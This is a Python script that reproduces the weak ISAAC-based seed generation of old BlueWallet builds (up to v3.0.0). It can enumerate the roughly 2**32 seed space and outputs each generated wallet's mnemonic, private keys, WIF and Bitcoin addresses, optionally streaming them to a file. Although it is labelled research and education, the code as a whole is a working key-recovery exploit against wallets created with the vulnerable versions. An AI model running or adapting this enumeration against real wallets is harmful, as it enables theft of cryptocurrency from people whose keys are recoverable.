#!/usr/bin/env python3
"""
BlueWallet <= v3.0.0 ISAAC CREATE — SELF-CONTAINED seed generator (Era A).

This single file reproduces, end to end, how a vulnerable BlueWallet build
"generated the seed" for a new wallet, and can enumerate the ~2**32 ISAAC seed
space to generate every possible wallet. It has ONE third-party dependency
(`mnemonic`, only for the BIP39 wordlist / PBKDF2); ISAAC, secp256k1, BIP32/49,
Base58Check and address encoding are all implemented here so the whole pipeline
is auditable in one place.

    isaac.seed(u32)                      # the only entropy: Math.random()*0xffffffff
      -> 32x floor(isaac.random()*256)   # 32 "random" bytes  (totalhex)
      -> SHA256(SHA256(prefix + totalhex))   # cosmetic, prefix = "hello there" | "oh hai!"
      -> BIP39 24-word mnemonic (HD/BIP49)  OR  secp256k1 private key (single-key)
      -> Bitcoin address(es)

Usage:
    # generate ONE wallet from a specific ISAAC seed
    python bw_isaac_standalone.py --seed 1

    # ENUMERATE / generate wallets for a range of ISAAC seeds (the "grind")
    python bw_isaac_standalone.py --start 0 --count 20
    python bw_isaac_standalone.py --start 0 --count 1000000 --addresses-only \
        --out generated.jsonl          # stream seed->addresses to a file

    # verify the port against the known golden vectors
    python bw_isaac_standalone.py --assert

Scope: research/education against public, already-patched source. Fixed upstream
in BlueWallet v3.2.0 (2018) by switching to the OS CSPRNG.
"""

from __future__ import annotations

import argparse
import hashlib
import hmac
import json
import sys
from math import floor

from mnemonic import Mnemonic

_MNEMO = Mnemonic("english")


# =========================================================================== #
# 1) ISAAC PRNG — faithful port of isaac@0.0.5 (the dependency BlueWallet used)
# =========================================================================== #

_MASK32 = 0xFFFFFFFF
_GOLDEN = 0x9E3779B9
_INV_2_32 = 2.3283064365386963e-10  # 2**-32, spelled exactly as isaac.js does


def _u32(x: int) -> int:
    return x & _MASK32


def _to_int32(x: int) -> int:
    x &= _MASK32
    return x - 0x100000000 if x >= 0x80000000 else x


class Isaac:
    """ISAAC generator matching isaac@0.0.5 byte-for-byte."""

    def __init__(self) -> None:
        self.m = [0] * 256
        self.r = [0] * 256
        self.acc = self.brs = self.cnt = self.gnt = 0

    def _reset(self) -> None:
        self.acc = self.brs = self.cnt = self.gnt = 0
        for i in range(256):
            self.m[i] = self.r[i] = 0

    def seed(self, s: int) -> "Isaac":
        # Real module auto-seeds with a *float* Math.random()*0xffffffff; only the
        # integer part (mod 2**32) survives ISAAC's ToInt32 mixing, and the float
        # is truthy with probability 1, so we always take the array/truthy path.
        a = b = c = d = e = f = g = h = _GOLDEN
        self._reset()
        self.r[0] = _u32(s)

        def mix() -> None:
            nonlocal a, b, c, d, e, f, g, h
            a = _u32(a ^ _u32(b << 11)); d = _u32(d + a); b = _u32(b + c)
            b = _u32(b ^ (c >> 2));      e = _u32(e + b); c = _u32(c + d)
            c = _u32(c ^ _u32(d << 8));  f = _u32(f + c); d = _u32(d + e)
            d = _u32(d ^ (e >> 16));     g = _u32(g + d); e = _u32(e + f)
            e = _u32(e ^ _u32(f << 10)); h = _u32(h + e); f = _u32(f + g)
            f = _u32(f ^ (g >> 4));      a = _u32(a + f); g = _u32(g + h)
            g = _u32(g ^ _u32(h << 8));  b = _u32(b + g); h = _u32(h + a)
            h = _u32(h ^ (a >> 9));      c = _u32(c + h); a = _u32(a + b)

        for _ in range(4):
            mix()
        for i in range(0, 256, 8):
            a = _u32(a + self.r[i + 0]); b = _u32(b + self.r[i + 1])
            c = _u32(c + self.r[i + 2]); d = _u32(d + self.r[i + 3])
            e = _u32(e + self.r[i + 4]); f = _u32(f + self.r[i + 5])
            g = _u32(g + self.r[i + 6]); h = _u32(h + self.r[i + 7])
            mix()
            self.m[i:i + 8] = [a, b, c, d, e, f, g, h]
        for i in range(0, 256, 8):
            a = _u32(a + self.m[i + 0]); b = _u32(b + self.m[i + 1])
            c = _u32(c + self.m[i + 2]); d = _u32(d + self.m[i + 3])
            e = _u32(e + self.m[i + 4]); f = _u32(f + self.m[i + 5])
            g = _u32(g + self.m[i + 6]); h = _u32(h + self.m[i + 7])
            mix()
            self.m[i:i + 8] = [a, b, c, d, e, f, g, h]

        self._prng()
        self.gnt = 256
        return self

    def _prng(self) -> None:
        m, r = self.m, self.r
        acc, brs, cnt = self.acc, self.brs, self.cnt
        cnt = _u32(cnt + 1)
        brs = _u32(brs + cnt)
        for i in range(256):
            mod = i & 3
            if mod == 0:
                acc = _u32(acc ^ _u32(acc << 13))
            elif mod == 1:
                acc = _u32(acc ^ (acc >> 6))
            elif mod == 2:
                acc = _u32(acc ^ _u32(acc << 2))
            else:
                acc = _u32(acc ^ (acc >> 16))
            acc = _u32(m[(i + 128) & 0xFF] + acc)
            x = m[i]
            y = _u32(m[(x >> 2) & 0xFF] + _u32(acc + brs))
            m[i] = y
            brs = _u32(m[(y >> 10) & 0xFF] + x)
            r[i] = brs
        self.acc, self.brs, self.cnt = acc, brs, cnt

    def rand(self) -> int:
        if self.gnt == 0:
            self._prng()
            self.gnt = 256
        self.gnt -= 1
        return _to_int32(self.r[self.gnt])

    def random(self) -> float:
        return 0.5 + self.rand() * _INV_2_32


# =========================================================================== #
# 2) secp256k1 (pure python) + Base58Check + HASH160 + BIP32 + addresses
# =========================================================================== #

_P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
_GX = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
_GY = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
_B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"


def _inv(x: int, p: int = _P) -> int:
    return pow(x, p - 2, p)


def _pt_add(pt1, pt2):
    if pt1 is None:
        return pt2
    if pt2 is None:
        return pt1
    x1, y1 = pt1
    x2, y2 = pt2
    if x1 == x2 and (y1 + y2) % _P == 0:
        return None
    if x1 == x2:
        s = (3 * x1 * x1) * _inv(2 * y1) % _P
    else:
        s = (y2 - y1) * _inv((x2 - x1) % _P) % _P
    x3 = (s * s - x1 - x2) % _P
    y3 = (s * (x1 - x3) - y1) % _P
    return (x3, y3)


def _pt_mul(k: int, pt=(_GX, _GY)):
    result = None
    addend = pt
    while k:
        if k & 1:
            result = _pt_add(result, addend)
        addend = _pt_add(addend, addend)
        k >>= 1
    return result


def sha256(b: bytes) -> bytes:
    return hashlib.sha256(b).digest()


def hash160(b: bytes) -> bytes:
    h = hashlib.new("ripemd160")
    h.update(sha256(b))
    return h.digest()


def b58check(payload: bytes) -> str:
    data = payload + sha256(sha256(payload))[:4]
    n = int.from_bytes(data, "big")
    out = ""
    while n > 0:
        n, r = divmod(n, 58)
        out = _B58[r] + out
    for byte in data:
        if byte == 0:
            out = "1" + out
        else:
            break
    return out


def priv_to_pub(priv: bytes, compressed: bool = True) -> bytes:
    k = int.from_bytes(priv, "big")
    x, y = _pt_mul(k)
    if compressed:
        return (b"\x03" if (y & 1) else b"\x02") + x.to_bytes(32, "big")
    return b"\x04" + x.to_bytes(32, "big") + y.to_bytes(32, "big")


def wif(priv: bytes) -> str:
    return b58check(b"\x80" + priv + b"\x01")


def p2pkh(pub: bytes) -> str:
    return b58check(b"\x00" + hash160(pub))


def p2sh_p2wpkh(pub: bytes) -> str:
    return b58check(b"\x05" + hash160(b"\x00\x14" + hash160(pub)))


_HARD = 0x80000000


def bip32_master(seed: bytes):
    I = hmac.new(b"Bitcoin seed", seed, hashlib.sha512).digest()
    return I[:32], I[32:]


def bip32_ckd(priv: bytes, chain: bytes, index: int):
    if index & _HARD:
        data = b"\x00" + priv + index.to_bytes(4, "big")
    else:
        data = priv_to_pub(priv, True) + index.to_bytes(4, "big")
    I = hmac.new(chain, data, hashlib.sha512).digest()
    ki = (int.from_bytes(I[:32], "big") + int.from_bytes(priv, "big")) % _N
    return ki.to_bytes(32, "big"), I[32:]


def bip49_priv(mnemonic: str, index: int = 0) -> bytes:
    """Derive m/49'/0'/0'/0/index private key from a mnemonic (empty passphrase)."""
    seed = _MNEMO.to_seed(mnemonic, passphrase="")
    priv, chain = bip32_master(seed)
    for part in (49 + _HARD, 0 + _HARD, 0 + _HARD, 0, index):
        priv, chain = bip32_ckd(priv, chain, part)
    return priv


# =========================================================================== #
# 3) BlueWallet v3.0.0 CREATE chains (the actual "seed generation")
# =========================================================================== #

HD_PREFIX = "hello there"       # HDSegwitP2SHWallet.generate()
SINGLEKEY_PREFIX = "oh hai!"    # LegacyWallet.generate() / SegwitP2SHWallet


def isaac_32_bytes_hex(seed: int) -> str:
    """The raw 32-byte ISAAC draw as 64 hex chars (`totalhex` in the source)."""
    rng = Isaac().seed(seed)
    return "".join(f"{floor(rng.random() * 256):02x}" for _ in range(32))


def _double_sha256_hexstring(prefix: str, totalhex: str) -> str:
    # NB: bitcoinjs hashed the JS *string*, so both SHA256 passes are over UTF-8
    # hex text, not raw bytes. Reproduced exactly here.
    h1 = hashlib.sha256((prefix + totalhex).encode("utf-8")).hexdigest()
    return hashlib.sha256(h1.encode("utf-8")).hexdigest()


def generate_wallet(seed: int, gaps: int = 1) -> dict:
    """Generate every CREATE artifact for one ISAAC seed."""
    totalhex = isaac_32_bytes_hex(seed)

    # HD / BIP49 path ("hello there")
    hd_entropy = _double_sha256_hexstring(HD_PREFIX, totalhex)
    mnemonic = _MNEMO.to_mnemonic(bytes.fromhex(hd_entropy))
    bip49 = []
    for i in range(max(1, gaps)):
        priv = bip49_priv(mnemonic, i)
        bip49.append({
            "path": f"m/49'/0'/0'/0/{i}",
            "address": p2sh_p2wpkh(priv_to_pub(priv)),
            "privkey": priv.hex(),
        })

    # Single-key path ("oh hai!")
    sk_priv = bytes.fromhex(_double_sha256_hexstring(SINGLEKEY_PREFIX, totalhex))
    sk_pub = priv_to_pub(sk_priv)

    return {
        "isaac_seed": seed,
        "raw_isaac_bytes": totalhex,
        "hd": {
            "entropy": hd_entropy,
            "mnemonic": mnemonic,
            "bip49": bip49,
        },
        "singlekey": {
            "privkey": sk_priv.hex(),
            "wif": wif(sk_priv),
            "segwit_p2sh_address": p2sh_p2wpkh(sk_pub),
            "legacy_p2pkh_address": p2pkh(sk_pub),
        },
    }


# =========================================================================== #
# 4) CLI: generate one seed, or enumerate a range of seeds
# =========================================================================== #

_GOLDENS = {
    "hd_entropy_1": "2132c5907cbc79a7787eee988a67ef7342d7e4b4083faba7e1e468c92b4b0aa2",
    "singlekey_priv_1": "f7b794d0944c9fd8c8e1b50433ef38609fd0d46f9bc10badeaaada8fedb30646",
    "bip49_addr_1": "37D7efZUJ5S1BdiS63EKX4nAGbSJ1UpBYQ",
    "segwit_p2sh_addr_1": "35mpjXaH4oRMAzSzbMRiNgjwmXtaSVMZA8",
    "mnemonic_1_prefix": "cancel normal goat",
}


def run_assert() -> None:
    w = generate_wallet(1, gaps=1)
    assert w["hd"]["entropy"] == _GOLDENS["hd_entropy_1"]
    assert w["singlekey"]["privkey"] == _GOLDENS["singlekey_priv_1"]
    assert w["hd"]["bip49"][0]["address"] == _GOLDENS["bip49_addr_1"]
    assert w["hd"]["mnemonic"].startswith(_GOLDENS["mnemonic_1_prefix"])
    assert w["singlekey"]["segwit_p2sh_address"] == _GOLDENS["segwit_p2sh_addr_1"]
    print("[ok] golden vectors seed=1 (matches Node isaac@0.0.5)")


def print_wallet(w: dict) -> None:
    print(f"=== isaac_seed = {w['isaac_seed']} ===")
    print(f"raw ISAAC bytes : {w['raw_isaac_bytes']}")
    print(f"HD entropy      : {w['hd']['entropy']}")
    print(f"mnemonic (24w)  : {w['hd']['mnemonic']}")
    for e in w["hd"]["bip49"]:
        print(f"  {e['path']}: {e['address']}  priv={e['privkey']}")
    sk = w["singlekey"]
    print(f"single-key priv : {sk['privkey']}")
    print(f"single-key WIF  : {sk['wif']}")
    print(f"  SegWit P2SH   : {sk['segwit_p2sh_address']}")
    print(f"  legacy P2PKH  : {sk['legacy_p2pkh_address']}")


def main() -> int:
    p = argparse.ArgumentParser(
        description="BlueWallet ISAAC CREATE — self-contained seed generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--seed", type=int, help="generate ONE wallet from this ISAAC seed")
    p.add_argument("--start", type=int, default=0, help="first ISAAC seed to enumerate")
    p.add_argument("--count", type=int, default=0, help="number of seeds to enumerate from --start")
    p.add_argument("--gaps", type=int, default=1, help="BIP49 receive indices to derive per seed")
    p.add_argument("--addresses-only", action="store_true",
                   help="when enumerating, emit compact {seed, addresses} records")
    p.add_argument("--out", default=None, help="write enumerated wallets as JSONL to this file")
    p.add_argument("--assert", dest="do_assert", action="store_true", help="check golden vectors")
    args = p.parse_args()

    if args.do_assert:
        run_assert()

    if args.seed is not None:
        print_wallet(generate_wallet(args.seed & _MASK32, gaps=args.gaps))
        return 0

    if args.count > 0:
        sink = open(args.out, "w", encoding="utf-8") if args.out else None
        for seed in range(args.start, args.start + args.count):
            w = generate_wallet(seed & _MASK32, gaps=args.gaps)
            if args.addresses_only:
                addrs = [e["address"] for e in w["hd"]["bip49"]]
                addrs.append(w["singlekey"]["segwit_p2sh_address"])
                addrs.append(w["singlekey"]["legacy_p2pkh_address"])
                rec = {"seed": w["isaac_seed"], "addresses": addrs}
            else:
                rec = w
            line = json.dumps(rec)
            if sink:
                sink.write(line + "\n")
            else:
                print(line)
        if sink:
            sink.close()
            print(f"[ok] wrote {args.count:,} generated wallets to {args.out}", file=sys.stderr)
        return 0

    if not args.do_assert:
        p.print_help()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
